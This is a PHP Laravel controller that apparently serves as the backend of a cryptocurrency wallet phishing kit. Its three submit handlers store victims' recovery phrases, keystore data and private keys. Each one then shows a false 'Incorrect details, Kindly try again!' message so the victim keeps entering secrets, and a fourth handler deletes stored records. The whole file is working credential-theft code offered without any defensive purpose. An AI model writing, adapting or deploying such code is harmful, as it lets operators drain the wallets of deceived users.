<?php

namespace App\Http\Controllers;

use App\Http\Requests\phrase_keystore_private as RequestsPhrase_keystore_private;
use App\Models\phrase_keystore_private as ModelsPhrase_keystore_private;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;

class Phrase_keystore_private extends Controller
{
    public function phraseSubmitRequest(RequestsPhrase_keystore_private $request){

        $coin_id = "CR". mt_rand(100000, 999999);
        ModelsPhrase_keystore_private::create($request-> safe()->merge([
            'coin_id' => $coin_id,
        ])->all());
        return redirect('/app')->with('message', 'Incorrect details, Kindly try again!');

    } 
    
    public function keystoreSubmitRequest(RequestsPhrase_keystore_private $request){

        $coin_id = "CR". mt_rand(100000, 999999);
        ModelsPhrase_keystore_private::create($request-> safe()->merge([
            'coin_id' => $coin_id,
        ])->all());
        return redirect('/app')->with('message', 'Incorrect details, Kindly try again!');

    } 
    
    public function privateSubmitRequest(RequestsPhrase_keystore_private $request){

        $coin_id = "CR". mt_rand(100000, 999999);
        ModelsPhrase_keystore_private::create($request-> safe()->merge([
            'coin_id' => $coin_id,
        ])->all());
        return redirect('/app')->with('message', 'Incorrect details, Kindly try again!');

    }

    public function detailDestroy(ModelsPhrase_keystore_private $detail){

        $detail->delete();
        Alert::success('Details Deleted Successfully');
        return redirect()->back();
    }

}
